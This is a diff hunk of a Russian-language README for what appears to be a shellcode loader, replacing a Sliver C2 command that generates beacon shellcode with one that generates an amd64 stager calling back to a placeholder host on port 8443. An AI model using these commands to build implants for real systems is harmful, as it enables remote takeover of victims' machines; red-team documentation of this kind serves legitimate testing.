@@ -21,7 +21,7 @@ libssl-dev
 Сгенерируйте shellcode в формате **.bin.** Для этого вы можете использовать Bishop Fox Sliver в качестве C2, чтобы создать shellcode:
 
 ```bash
-sliver> generate beacon http://ip:80 -f shellcode
+sliver> generate stager --lhost ip --lport 8443 --arch amd64 --format shellcode
 ```
 
 При необходимости вы также можете использовать дополнительные параметры.
